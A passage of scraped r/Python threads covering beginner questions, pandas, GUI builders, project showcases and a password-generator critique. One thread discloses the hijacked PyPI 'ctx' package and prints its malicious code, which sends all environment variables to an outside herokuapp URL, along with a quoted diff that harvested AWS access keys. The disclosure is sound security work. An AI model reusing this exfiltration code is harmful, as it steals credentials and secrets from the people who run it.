    "post_time": "Wednesday, April 10, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "DrPreppy",
            "score": "1",
            "content": "Howdy! I'm an experienced programmer but am still at derp level in Python. I have an array: mybytes = array('B', open(somefile, 'rb').read()) I know that mybytes[8:12] is an integer value that I would like to update by assigning a known value to. Do any of you smarter/more experienced people know how to do that? I would think the syntax is something like: mybytes[8:12] = array('B', [newValue]) , but that appears to be tragically wrong as are my other attempts currently. I can clumsily write to mybytes byte by byte, but I thought it would be swell if I could assign the four byte long value to that specific slice. Thanks for your time. :)",
            "replies": [
                {
                    "author": "AdvancedCommon2417",
                    "score": "1",
                    "content": "mybytes[8:12] = array('B', newValue.to_bytes(4))"
                }
            ]
        },
        {
            "author": "Serious_Initiative_6",
            "score": "1",
            "content": "Hi I'm interested in learning Python. I've downloaded it & PyCharm & am working my way through the HarvardCS50 Python Programming course and about 5 hours in I've started to think I am probably not going to be able to teach myself. I'm wondering if anyone has any experience with any online courses. I've done some programming but not in a while & it was VB/CSS. I would like to be able to do remote contract work so ideally it would be something not too expensive but with an opportunity for a certificate at the end. Does anyone have a recommendation?",
            "replies": [
                {
                    "author": "Avicii-X",
                    "score": "1",
                    "content": "Hey, any luck?"
                }
            ]
        },
        {
            "author": "UnemployedTechie2021",
            "score": "1",
            "content": "Edit: I think I am too late to the party, probably should post it this Wednesday's thread. I want to relearn Python because I have been searching for an opportunity for a while now but am not getting any. This has jolted the pillars of my confidence because I am not a beginner. I have around 20 years of work experience, I have worked with a Big 4 for 10 years some of which were as a Manager of a DataViz team. I have been learning coding since the time of MS Dos and have been a Teaching Assistant for a Deep Learning course. I understand that r/Python won't be able to help me gain my confidence, that's not the purpose of this sub. However, I personally feel that if I relearn Python I would be able to gain back some of the lost confidence. So I am asking for your feedback and help. If I were to relearn Python, will CS50 be a good idea? Is this the correct URL for CS50? https://cs50.harvard.edu/x/2024/ I see that CS50 has other topics like C, SQL etc other than Python. However, I do not see pointers which is making me rethink about CS50. Will CS50 cover majority of the important topics for Python, or will it omit important topics like pointers for C in Python too? Can somebody suggest a note taking method why I can apply to keep notes from this course which will not only help me in future but others too since I plan to make my progress etc open-source. Any help would be highly appreciated. Thanks in advance."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1byji96",
    "post_score": "7",
    "post_time": "Monday, April 8, 2024 at 3:00:13 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Monday Daily Thread: Project ideas!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Worth_Specific3764",
            "score": "0",
            "content": "This is excellent— I am completely on board 👍"
        }
    ]
},
{
    "post_author": "DeskAdministrative42",
    "post_id": "1c34vk8",
    "post_score": "5",
    "post_time": "Saturday, April 13, 2024 at 6:42:34 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Pandas - value replacement or interpolation",
    "media": [],
    "post_content": "Hi all, here trying to replace values for a range of dates in a data frame copy I've made where DateTime is the index and the values I need to mass replace are in the 'Value' column.\nThe reason why is I need to interpolate between two dates in a time series, where the data I have is incorrect due to measurement error. I need to replace it with interpolated data to make a more representative data set for forecasting\nCan anyone advise?",
    "comments": [
        {
            "author": "o--h--o",
            "score": "3",
            "content": "You can use the interpolate function",
            "replies": [
                {
                    "author": "DeskAdministrative42",
                    "score": "1",
                    "content": "Thanks I have tried the mask and interpolate but difficult to get them to replace values over a long duration where there was meter error",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "Hey, thanks so much for your help. Correct, there is a section of values within a specific date range (2 months over a year) where the meter is frozen on an incorrect value over all time periods. I want to define this period and interpolate or do some kind of prediction to fill it as naturally as possible. The challenge I have is the data is very seasonal and has a weekly pattern, so inputting this correctly is difficult, linear interpolation won't work I'm wondering if cubic spline may be better or even a machine learning type",
                            "replies": [
                                {
                                    "author": "DeskAdministrative42",
                                    "score": "1",
                                    "content": "Hey, thanks so much for your help. Correct, there is a section of values within a specific date range (2 months over a year) where the meter is frozen on an incorrect value over all time periods. I want to define this period and interpolate or do some kind of prediction to fill it as naturally as possible. The challenge I have is the data is very seasonal and has a weekly pattern, so inputting this correctly is difficult, linear interpolation won't work I'm wondering if cubic spline may be better or even a machine learning type"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "hotplasmatits",
            "score": "2",
            "content": "I probably don't understand you right, but it sounds like you want to create a mask that's true where the dates are in a range, then df.loc[mask,'values']=new_vals"
        }
    ]
},
{
    "post_author": "z_mitchell",
    "post_id": "1bzvlhq",
    "post_score": "10",
    "post_time": "Tuesday, April 9, 2024 at 6:53:21 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Using Jupyter Notebooks with Flox",
    "media": [
        "https://flox.dev/blog/jupyter-remote-env"
    ],
    "post_content": "https://flox.dev/blog/jupyter-remote-env\nHey everyone, we released Flox 1.0 a few weeks ago and one of the cool things you can do is set up environments with a bunch of dependencies already set up for running a Jupyter notebook. Take a look to see how it all works!",
    "comments": [
        {
            "author": "Annual_Nothing_8157",
            "score": "1",
            "content": "python :skull:"
        }
    ]
},
{
    "post_author": "import-username-as-u",
    "post_id": "da8qdy",
    "post_score": "1823",
    "post_time": "Saturday, September 28, 2019 at 3:06:44 AM GMT+3",
    "flair_text": "",
    "post_title": "I dislike Tkinter so I made a Drag-and-Drop Gui builder to make it less painful.",
    "media": [
        "https://external-preview.redd.it/_8Z-xEcdOWh084gOdr2wd59wu1yaXDnaCaghooLQ7HM.png?width=640&crop=smart&format=pjpg&auto=webp&s=235769ab3c8da3a80890abc9febc459abbb22d57"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "import-username-as-u",
            "score": "174",
            "content": "All you have to do is pull it and run main.py I like to think it’s intuitive and would love some feedback. It currently has support for Buttons, Dropdowns, InputFields, Labels, CheckButtons, SpinBoxs, and RadioButtons as well as Toplevels and scroll-frames/frames. It generates a directory full of code that’s written to run your application and you just fill in the logic. Button named “hi” Generates def hi_button_fill(self): return “whatever the button should say” def hi_button_click(self): print(“you clicked me”) You have the power to do whatever you want. It just builds the GUI for you, and makes it resizable. It’s built completely on builtins, so if you wanted to package your final product and turn it into a .exe that’s no problem. Build a GUI, save the project, Fill in the blanks for the logic. You’re done! https://github.com/TristenHarr/MyPyBuilder Feedback appreciated! This took almost 100 hours to do, and it’s going to continue being improved and expanded on! I want to open-source it under an MIT license. EDIT: This blew up. I was hoping people might take notice but I never expected this level of response! Thank you all so much for the encouragement! As of now I am hoping to expand the project and have ideas for a direction I want to take it. This is the first project I’ve ever written that I’ve actually shared, so I’m brand new to this. Anyone who has experience with open source software, or wants to contribute please message me! EDIT: Detailed README is now up. Should explain just about everything you need to know to use this!",
            "replies": [
                {
                    "author": "Versaiteis",
                    "score": "40",
                    "content": "So, because I'm a back-end guy, one thing I've always wanted out of the several GUI toolkits that I've seen is a way of essentially defining my views through config files which are generally super straight forward to even change on the fly if needed. It would even enable/empower the technically inclined, but not-quite-programmer-level customers that I have to create their own views for data that suit them and their needs best (I'm working in the game-dev space here). I think that's why I find Electron enticing because using HTML, CSS, and JS (or really just HTML) is essentially just that. But the overhead is a pretty massive bite to take and hard to justify. That said this looks interesting and is certainly a step in a direction that I'm very interested to keep an eye on. Thanks for sharing! Edit: You guys are fucking awesome, thank you for all the replies and suggestions!",
                    "replies": [
                        {
                            "author": "wailashi",
                            "score": "11",
                            "content": "You can do this with Python and Qt. Design your GUI in Qt Designer and then dynamically load the .ui files in python."
                        },
                        {
                            "author": "driscollis",
                            "score": "9",
                            "content": "PyQt and wxPython both have UIs that can be defined in XML"
                        },
                        {
                            "author": "bacondev",
                            "score": "6",
                            "content": "Why not add a parser library and plug the parsed values into the GUI config code? Doesn't seem like it'd be too terribly difficult for simple use cases."
                        },
                        {
                            "author": "sheytanelkebir",
                            "score": "6",
                            "content": "PySimpleGui is the answer.",
                            "replies": [
                                {
                                    "author": "MikeTheWatchGuy",
                                    "score": "5",
                                    "content": "A PySimpleGUI designer was released earlier this year.. It's being actively re-worked by that author to make it considerably better and I believe he's using a different approach than the first where PySimpleGUI code is directly produced. I don't know all the details just yet. There is an accompanying YouTube video. I expect the next version to be considerably better than the first. Regardless, anyone, including the OP of course, making tools like this to make GUIs available to more people is an awesome thing! Everyone should be able to create GUI programs, regardless of education level."
                                }
                            ]
                        },
                        {
                            "author": "TheDankOG",
                            "score": "3",
                            "content": "This one is a decent option for the config file route: https://github.com/tmetsch/pytkgen"
                        },
                        {
                            "author": "dudeplace",
                            "score": "1",
                            "content": "This is how we do it at work. (Website with paired app dev) We have xml config files that let \"advanced\" people layout forms using js syntax in formulas for different attributes. We have an sdk that parses the xml adds columns in the database, and builds the HTML/js needed to render the form.",
                            "replies": [
                                {
                                    "author": "Versaiteis",
                                    "score": "3",
                                    "content": "I've done stuff like that, and I'm not super opposed to it, but by doing that you assume all of the responsibilities of a web dev. Like I don't want to have to worry about Chrome updating/deprecating something that our infrastructure depends on or worry about compatability for the one guy that uses Edge but is high enough up the chain for their opinion to actually matter. Electron lets you get around this because your app uses it's own version of chromium that you can update in lock-step with your app. Insomniac has a good slide deck on some of the pitfalls of heavily depending on this sort of tooling infrastructure. From 2010 and some of it may or may not apply depending on the studio and the kind of situation the studio finds itself in."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "PhoenixizFire",
            "score": "209",
            "content": "<insert Thanos meme> I used the Tkinter to create the Tkinter"
        },
        {
            "author": "loosh63",
            "score": "45",
            "content": "kinda like QtDesigner but for tkinter, awesome!!"
        },
        {
            "author": "5Beans6",
            "score": "39",
            "content": "OH-LY-FUCK! Thank you so much!!! I have always wanted to make GUI programs but the tedious process thats involved is so incredibly unfufilling for me that it kills my motivation."
        }
    ]
},
{
    "post_author": "kaapipo",
    "post_id": "duyjs7",
    "post_score": "1739",
    "post_time": "Monday, November 11, 2019 at 11:36:57 PM GMT+3",
    "flair_text": "",
    "post_title": "I made c++-style printing in Python :P",
    "media": [
        "https://preview.redd.it/5x2x03vib4y31.png?auto=webp&s=da93ed414710a2c157f5cd80f1806edaf610c94f",
        "https://i.redd.it/5x2x03vib4y31.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "484448444844",
            "score": "195",
            "content": "We are going full circle- Creating high level languages so we can recreate the low levels",
            "replies": [
                {
                    "author": "Racer-ICEEs",
                    "score": "19",
                    "content": "What magical number is ur username?",
                    "replies": [
                        {
                            "author": "484448444844",
                            "score": "74",
                            "content": "It's 448444844484 backwards"
                        },
                        {
                            "author": "theboxislost",
                            "score": "7",
                            "content": "If it's ASCII numbers, it translates to 0,0,0,. edit: or more likely HDHDHD if they're hex."
                        }
                    ]
                },
                {
                    "author": "GoofAckYoorsElf",
                    "score": "1",
                    "content": "I'm waiting for an assembly parser in python. Thought about writing a C64 emulator... There already is.",
                    "replies": [
                        {
                            "author": "hjd_thd",
                            "score": "1",
                            "content": "I've thought about writing 6502 assembler in Python."
                        }
                    ]
                }
            ]
        },
        {
            "author": "indxxxd",
            "score": "552",
            "content": "I hate it. Take this +1, and let me be on my way :)"
        },
        {
            "author": "[deleted]",
            "score": "190",
            "content": "You're a monster."
        },
        {
            "author": "appinv",
            "score": "135",
            "content": "+1 What this freakish pic? It's actually NSFW in Python land."
        },
        {
            "author": "SV-97",
            "score": "101",
            "content": "Eww"
        },
        {
            "author": "fatbob42",
            "score": "66",
            "content": "I’d prefer it the other way round - f-strings in C++ :)"
        },
        {
            "author": "[deleted]",
            "score": "101",
            "content": "Yikes. Technically, endl should flush the buffer rather than just print a newline. You could make this more accurate by including a flush=True argument in your print statement. But convoluted aliases are... fun I guess?"
        },
        {
            "author": "ubernostrum",
            "score": "51",
            "content": "Not-so-fun fact: in Python 2 the print statement allowed you to use a >> to send its output to any file-like object. Not quite the same as C++, though, because it worked like this: import sys print >> sys.stderr, \"This goes to stderr\" So the order was \"wrong\" (string to print came after thing to print to), and it also required a comma to make it work."
        },
        {
            "author": "sam-lb",
            "score": "34",
            "content": "Please forgive me. I made cin. https://gist.github.com/sam-lb/38824677afaa16334b590b1c2b0e5a24"
        },
        {
            "author": "knuppar",
            "score": "14",
            "content": "Thanks, 10/10. I hate it"
        }
    ]
},
{
    "post_author": "jackh53453",
    "post_id": "1c30tbf",
    "post_score": "2",
    "post_time": "Saturday, April 13, 2024 at 3:28:48 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Topic ideas for talk ",
    "media": [],
    "post_content": "I’m thinking about giving a talk at my Python group but struggling to think of an interesting topic. Any suggestions or recommendations of ways of brainstorming? I like running so was thinking about a talk about using the Strava API, maybe get the top running shoes, but not sure if that’d interest other people. Topic ideas please!",
    "comments": []
},
{
    "post_author": "fexx3l",
    "post_id": "1bzlkk4",
    "post_score": "39",
    "post_time": "Tuesday, April 9, 2024 at 9:44:56 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "automathon: A Python library for simulating and visualizing finite automata",
    "media": [
        "https://lipsum.dev/2024-01-1-automates-regex-presburger/",
        "https://rohaquinlop.github.io/automathon/",
        "https://github.com/rohaquinlop/automathon"
    ],
    "post_content": "What my project does\nautomathon is a Python library for simulating and visualizing finite automata, is easy to use and have a docs website to read more about the functions that are implemented for DFAs and NFAs.\nDuring my CS degree, I learned about automata and this became one of my favorite topics, that's why I started to work on this project, I wanted to create something simple and easy to use.\nTarget audience\nStudents, professors and any developer that could need to use automata.\nComparison\nI don't know if there's any python library that let you simulate finite automata, but I'm sure you will love this one, there's a blog talking about automata and have examples using automathon, you can read it, it's written in French.",
    "comments": [
        {
            "author": "JOHNJRAMBO2403",
            "score": "1",
            "content": "Can we develop and extend this package to have Pushdown Automatas and Turing machine simulations in similar way ?",
            "replies": [
                {
                    "author": "fexx3l",
                    "score": "2",
                    "content": "of course, this will be added later, you can create an issue in the repo and work on it if you want to"
                }
            ]
        }
    ]
},
{
    "post_author": "unexpected_possum",
    "post_id": "1by2njk",
    "post_score": "23",
    "post_time": "Sunday, April 7, 2024 at 2:51:53 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Gmail Filter Squasher project",
    "media": [
        "https://github.com/Ajordat/gmail_filter_squasher",
        "https://support.google.com/mail/thread/202079004/merge-filters?hl=en"
    ],
    "post_content": "In Gmail I realized that I had way too many filters that performed exactly the same action, but they simply had different \"from\" addresses. To solve this I created this little project that merges similar filters into a single one.\nIt does require a lot of setup due to having to authenticate into Gmail, but if someone is on the same situation as me, it could be helpful.\nLink to the project: github\nWhat My Project Does\nIt connects into a Gmail account, reads their filters and squashes them into a single one.\nThe program requires a manual setup of creating an OAuth credentials screen and downloading relevant credentials, which is cumbersome. But it's a one time effort as you can keep on using the application as long as you keep access to the GCP project.\nNote that it only merges filters if their criteria is a single \"from\" statement and they perform exactly the same action.\nTarget Audience\nIt's just a toy project of mine that I did for my sole benefit, but thought that it could be of use to anyone else in my same situation.\nComparison\nI tried to look up for an already-existing solution for this issue before implementing it myself, but I couldn't find it. Relevant Gmail support post.\nPlease do let me know if you have any suggestion or advice.\nLink to the project: github",
    "comments": [
        {
            "author": "[deleted]",
            "score": "6",
            "content": "With Gmail you can add a \"+XYZ\" before the @ in your email then set up a filter based on the \"to\" rather than from. Does this sound like an alternative solution?",
            "replies": [
                {
                    "author": "dAnjou",
                    "score": "1",
                    "content": "Would that work with websites you've logged in with SSO? Not sure if they let you use a suffixed email address then. As far as I know the + is a Gmail convention, so websites can't generally assume that a + email address is in fact an alias."
                },
                {
                    "author": "unexpected_possum",
                    "score": "1",
                    "content": "I don't think so, although for sure an alternative if we provide our email to a new site. If it requires creating a filter, you would eventually run into the same issue but with the \"to\" field instead of the \"from\" if at some point you decided to assign the same action to different +tags. Besides, that would be a preventative action for future sites that will send us emails. If we wanted to fix the current status, I understand we would need to change our email address everywhere we would be receiving emails from. Correct me if I misunderstood your approach though."
                }
            ]
        },
        {
            "author": "internautka",
            "score": "1",
            "content": "Wow I'm so glad to see this; I thought about doing something like it myself. Thank you! What I really had in mind was a flexible way to manage filtering based on sender email but this is a huge step forward. ps. I appreciate possums :)",
            "replies": [
                {
                    "author": "unexpected_possum",
                    "score": "1",
                    "content": "I'm glad you like it! :D"
                }
            ]
        }
    ]
},
{
    "post_author": "jimtk",
    "post_id": "uwhzkj",
    "post_score": "1821",
    "post_time": "Tuesday, May 24, 2022 at 6:48:40 AM GMT+3",
    "flair_text": "News",
    "post_title": "I think the CTX package on PyPI has been hacked!",
    "media": [
        "https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k/"
    ],
    "post_content": "There was a post here recently about an update to the CTX package. A simple package that allow you to access dictionary items using the dot notation (a_dict['key'] becomes a_dict.key). The post is here and OP was SocketPuppets\nThat package had not changed in 8 years. The OP said it was recently updated, and on PyPI it was updated as of May 21st. But the Github repo does not reflect any changes (it still 8 years old). When asked about it OP said it was copied to a corporate repo and that he would update the original repo.\nOut of curiosity I downloaded the source code from PyPI and look what I found! It seems like every time you create a dictionary it sends all your environment variables to a URL. That's not kosher.\n    def __init__(self):\n        self.sendRequest()\n    .\n    .  # code that performs dict access\n    .  # please DO NOT RUN THIS CODE !\n\n     def sendRequest(self):\n        string = \"\"\n        for _, value in environ.items():\n            string += value+\" \"\n\n        message_bytes = string.encode('ascii')\n        base64_bytes = base64.b64encode(message_bytes)\n        base64_message = base64_bytes.decode('ascii')\n\n        response = requests.get(\"https://anti-theft-web.herokuapp.com/hacked/\"+base64_message)\nI'm not a professional python programmer, just a retired, old CS graduate. Can someone raise that up to the proper \"authorities\" please.\nThanks.",
    "comments": [
        {
            "author": "IAmKindOfCreative",
            "score": "1",
            "content": "Nice due diligence u/jimtk! I do have to warn everyone that we do not support harassment of any kind in this community, so I ask that while folks are welcome to criticize what was done, please don't attack or harass anyone.",
            "replies": [
                {
                    "author": "coderanger",
                    "score": "3",
                    "content": "A full incident report has been posted to https://python-security.readthedocs.io/pypi-vuln/index-2022-05-24-ctx-domain-takeover.html, thanks to all who reported it.",
                    "replies": [
                        {
                            "author": "encyclopedist",
                            "score": "1",
                            "content": "I could not find a link to that \"python-security\" site anywhere on python.org or pipy.org . So when I wanted to find more detail, it was not straightforward. Should not this be made more prominent?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "727",
            "content": "Report the package here https://pypi.org/security/",
            "replies": [
                {
                    "author": "nonades",
                    "score": "358",
                    "content": "Definitely this. It's extremely fucked that this package is doing this. *edit I also emailed Heroku's support about this abuse of their services"
                }
            ]
        },
        {
            "author": "antipsychosis",
            "score": "249",
            "content": "https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k/i9ryw8l/ Just wanna throw this out there. OP: SocketPuppets, if you look into their post history, you find medium articles that SocketPuppets claims to write and in one they have their personal gmail acct at the bottom. If you follow that, you'll find a github account with the username aydinnyunus which has the same avatar as SocketPuppets's medium account. If you look into that github account aydinnyunus, you'll find python source code in a repo named gateCracker which also does poorly written requests to a heroku app in the same way this malicious code does. SocketPuppets seems like 99.9% certainly the alias of aydinnyunus which is used to push this malicious code and defend it. And, when it comes to aydinnyunus, you can find all their info via their github account. They're a self-proclaimed \"security researcher,\" and their repo gateCracker doesn't actually \"crack gates,\" it (which has code EXACTLY like this malicious code making a req. to a heroku app endpoint,) just returns some text that tells you the default password/interaction for a couple different popular models. Godspeed brothers."
        },
        {
            "author": "[deleted]",
            "score": "161",
            "content": "And it's gone. All previous releases of the project were removed and replaced with the malicious copies. As such this project has been removed and prohibited from re-registration without admin intervention. According to WHOIS records, the domain for the email address registered to the User owning the project was registered on 2022-05-14T18:40:05Z, which indicates that this was a domain take-over attack and not a direct compromise of PyPI."
        },
        {
            "author": "Cuasey",
            "score": "299",
            "content": "Wow, not even using fstrings.. smh",
            "replies": [
                {
                    "author": "chucklesoclock",
                    "score": "261",
                    "content": "Yeah can we refactor this malicious code? string = \"\" for _, value in environ.items(): string += value+\" \" is equivalent to string = \" \".join(environ.values())"
                }
            ]
        },
        {
            "author": "vinyasmusic",
            "score": "67",
            "content": "Seems like he wanted AWS creds for mining most probably."
        },
        {
            "author": "ChaserGrey",
            "score": "57",
            "content": "Without a trace of irony: not all heroes wear capes. Thank you for performing a public service."
        },
        {
            "author": "Matir",
            "score": "113",
            "content": "In 0.1.2 and 0.2.2 the adversary was looking specifically for AWS tokens: -        if environ.get('AWS_ACCESS_KEY_ID') is not None: -            self.access = environ.get('AWS_ACCESS_KEY_ID') -        else: -            self.access = \"empty\" - -        if environ.get('COMPUTERNAME') is not None: -            self.name = environ.get('COMPUTERNAME') -        elif uname() is not None: -            self.name = uname().nodename -        else: -            self.name = \"empty\" - -        if environ.get('AWS_SECRET_ACCESS_KEY') is not None: -            self.secret = environ.get('AWS_SECRET_ACCESS_KEY') -        else: -            self.secret = \"empty\" They also deleted all older versions from pypi."
        }
    ]
},
{
    "post_author": "esc28",
    "post_id": "hjxqxr",
    "post_score": "1734",
    "post_time": "Thursday, July 2, 2020 at 5:13:12 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Using only Python, I made a web dashboard to follow the coronavirus situation in Brazil",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "LucasHeck",
            "score": "58",
            "content": "Bom trabalho!"
        },
        {
            "author": "esc28",
            "score": "73",
            "content": "I used plotly Dash and Dash Bootstrap Components to make a web dashboard with 100% Python code. I found pretty easy to use and host the Flask app in Heroku. You can access it in the link: https://brashboard.herokuapp.com/",
            "replies": [
                {
                    "author": "Jonklopez",
                    "score": "8",
                    "content": "Where are you getting the data from ?",
                    "replies": [
                        {
                            "author": "LamedVavnik",
                            "score": "8",
                            "content": "Probably https://covid.saude.gov.br/ . Or maybe he gets the data from each state site, but that would make the work harder, as the data inst uniform."
                        }
                    ]
                },
                {
                    "author": "dethb0y",
                    "score": "1",
                    "content": "very nice work!"
                }
            ]
        },
        {
            "author": "Kiehlu",
            "score": "53",
            "content": "Can you do tutorial for new programmers ?"
        },
        {
            "author": "knusted",
            "score": "18",
            "content": "Muito legal ter brasileiros nos fóruns! Bom trabalho"
        },
        {
            "author": "MrQu4tro",
            "score": "10",
            "content": "It's weird to see my city in reddit"
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "Fucking amazing work! 🔥"
        },
        {
            "author": "gangstter",
            "score": "7",
            "content": "Bom trabalho 2!"
        },
        {
            "author": "alien6",
            "score": "7",
            "content": "1.9% of the population in Pacaraima were infected just this week?!"
        },
        {
            "author": "desperatepower",
            "score": "6",
            "content": "Really great, how long have you been learning/using python?"
        },
        {
            "author": "KaiXtr",
            "score": "6",
            "content": "Adoro esses projetos sobre o corona vírus, nós programadores estamos ajudando e fazendo algo a respeito"
        }
    ]
},
{
    "post_author": "BasePlate_Admin",
    "post_id": "1c2tudb",
    "post_score": "7",
    "post_time": "Saturday, April 13, 2024 at 7:54:35 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "resvg-py, safe bindings for resvg project",
    "media": [
        "https://github.com/baseplate-admin/resvg-py",
        "https://resvg-py.readthedocs.io/en/latest/index.html",
        "https://github.com/baseplate-admin/coreproject",
        "https://www.npmjs.com/package/@vercel/og"
    ],
    "post_content": "Hi everyone,\nGithub\nDocumentation\nWhat my project does :\nFor a long time, i had a problem of rendering svg to png format. Specially after my project required opengraph image generation. Vercel's OG supports this functionality but that's JavaScript.\nSo therefore i created this bindings to resvg library (same library used by vercel og)\nTarger Audience\nDevelopers\nUsage\nInstall it like this:\npip install resvg_py\nThen use it like this:\nimport resvg_py\n\nsvg_string = \"\"\"\n    <svg width=\"300\" height=\"130\" xmlns=\"http://www.w3.org/2000/svg\">\n      <rect width=\"200\" height=\"100\" x=\"10\" y=\"10\" rx=\"20\" ry=\"20\" fill=\"blue\" />\n    </svg>\n\"\"\"\n\nprint(resvg_py.svg_to_base64(svg_string))\nGoals:\nTo enable all the features available in resvg but don’t write to the disk, everything must be done in memory.\nUse the bare minimum amount of packages, in both python side and rust side\nMake the package as user friendly as possible\nComparison\nI don't think theres any project that has safe bindings for resvg\nPlease do note that this is my first time writing a package in rust.",
    "comments": [
        {
            "author": "keidainc",
            "score": "1",
            "content": "This is cool! You mention using this for \"opengraph image generation\". However, if I remember correctly og:image requires a url to the image whereas this package returns the image as bytes. How do you overcome this?",
            "replies": [
                {
                    "author": "BasePlate_Admin",
                    "score": "1",
                    "content": "Hi thanks for your interest in this. However, if I remember correctly og:image requires a url to the image whereas this package returns the image as bytes. You use this package in combination with a web-framework like django/flask/fastapi/litestar and serve the BytesIO object with appropriate headers.",
                    "replies": [
                        {
                            "author": "keidainc",
                            "score": "1",
                            "content": "Makes sense, thanks!",
                            "replies": [
                                {
                                    "author": "BasePlate_Admin",
                                    "score": "1",
                                    "content": "Let me know if you want a section in the documentation where it explain how to use it with web frameworks"
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "HBRYU",
    "post_id": "cix5ek",
    "post_score": "1820",
    "post_time": "Sunday, July 28, 2019 at 6:28:37 PM GMT+3",
    "flair_text": "",
    "post_title": "I made a script that uses the mouse and keyboard to scan a grayscale image and replicates it in ms paint",
    "media": [
        "https://preview.redd.it/fg8a7a9mb2d31.png?width=640&crop=smart&auto=webp&s=4c2bd30a7e1fc1ff376a2b9caefc78f0116b2065",
        "https://i.redd.it/fg8a7a9mb2d31.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "swethonay",
            "score": "421",
            "content": "What kind of monster uses a font that isn't monospaced‽"
        },
        {
            "author": "mfitzp",
            "score": "78",
            "content": "Maybe I'm missing something here but what does it do? Does it draw the image using MS Paint? i.e. converting it into paths? Or does it do a raster copy, i.e. pixel by pixel from one image to another? (this would be a lot less hard)."
        },
        {
            "author": "Fiskepudding",
            "score": "32",
            "content": "Good work! Are you coding in notepad++? Did you know there are editors specifically made for coding? They can help out a lot, both explaining the code, automating tasks and detect errors. If you have some spare time, look into PyCharm or VsCode (with a python plugin). It can make your life easier. Good luck with your coding adventures!"
        },
        {
            "author": "AcousticDan",
            "score": "12",
            "content": "how does it use the keyboard?"
        },
        {
            "author": "jantari",
            "score": "8",
            "content": "Hmm.. i\"m confused, if it scans and replicates the image why is it not an exact 1:1 copy? It looks lower quality than the original"
        },
        {
            "author": "andrekerygma",
            "score": "33",
            "content": "Wow!!"
        },
        {
            "author": "EverythingIsFlotsam",
            "score": "4",
            "content": "range(x) already gives 0..x-1. You probably didn't need to do for i in range(len(img)-1)"
        },
        {
            "author": "12si27",
            "score": "4",
            "content": "If u are Korean I recommend you to use great Korean monoscape fonts like: Noto Sans Mono or 나눔고딕코딩, D2Coding.. Stuff like that And also, great project 👍"
        }
    ]
},
{
    "post_author": "RRTheGuy",
    "post_id": "1c0p8gc",
    "post_score": "0",
    "post_time": "Wednesday, April 10, 2024 at 7:05:59 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pwdgen - a simple password generator",
    "media": [
        "https://bitwarden.com/password-generator/",
        "https://my.norton.com/extspa/passwordmanager?path=pwd-gen",
        "https://www.avast.com/random-password-generator",
        "https://www.dashlane.com/features/password-generator",
        "https://github.com/RadoTheProgrammer/pwdgen"
    ],
    "post_content": "What my project does\nMy project generate simple, strong, memorable and easy-to-type passwords.\nTarget audience\nFor anyone who need to get passwords easily.\nComparison\nMost passwords manager generate completely passwords with completely random characters that aren't very easy to memorize or tape.\nExamples include Dashlane, Norton, Avast.\nOr other like Bitwarden generate passwords that are not really fast-to-type.\nThe mine generate sth like 6Nixe#Becokace 0Qubyby+Pomafy , or 7Zuxogu:Lebuwo . I wanted to make a password generator that combines simplicity, security, memorability, and ease of type.\nUsage\nYou can install it with pip install pwd-generator and use the cli version:\npwdgen\nTo use it in a python code\nimport pwdgen\nprint(pwdgen.generate())\nSource code\nThe source code is on github",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "andy_a904guy_com",
            "score": "55",
            "content": "Print Working Directory Generator.",
            "replies": [
                {
                    "author": "JauriXD",
                    "score": "5",
                    "content": "My first thought exactly 🤣"
                }
            ]
        },
        {
            "author": "knellotron",
            "score": "79",
            "content": "Are you aware of the big red warning box on the documentation for import random?",
            "replies": [
                {
                    "author": "greebly_weeblies",
                    "score": "61",
                    "content": "Probably worth being more explicit: \"Warning: The pseudo-random generators of this module should not be used for security purposes. For security or cryptographic uses, see the secrets module. [emphasis mine]\" -- random module docs"
                },
                {
                    "author": "azthal",
                    "score": "27",
                    "content": "While this is strictly speaking correct, and I do agree with pointing this out as good practice, for the purposes here, in practical terms, it doesn't really matter. Why? Random uses os.urandom to get its seed by default. This number should be secure. This means that unless you are running an extremely outdated OS, there is no way of predicting what the seed is. The other risk is that if you use random to generate a whole bunch of numbers, all one after another, you could start to reverse engineer what the seed must have been, and thereby predict future numbers. This is real bad in encryption. Thing is though, a script like this uses a new, secure, seed each time it's run. You can't gather a whole bunch of data, because the various passwords are not connected by a seed. Even if you did somehow capture and despite the low amount of data, managed to figure out what the next number in the sequence would be, that wouldn't help you in figuring out what the next password would be. Simply put, using secrets is the proper way of doing this, and there's no reason not to do it properly. From a real security standpoint though, in this use case, it's a non-issue."
                }
            ]
        },
        {
            "author": "chrispurcell",
            "score": "40",
            "content": "This is junk. You arent generating anything memorable or easy to type. Why would anyone use this instead of pwgen?",
            "replies": [
                {
                    "author": "greebly_weeblies",
                    "score": "28",
                    "content": "Worse, because of the similar module name, and because it's being held out as a solution, not a toy, someone, somewhere is going to end up using this for real, leaving their credentials vulnerable."
                }
            ]
        },
        {
            "author": "arwinda",
            "score": "14",
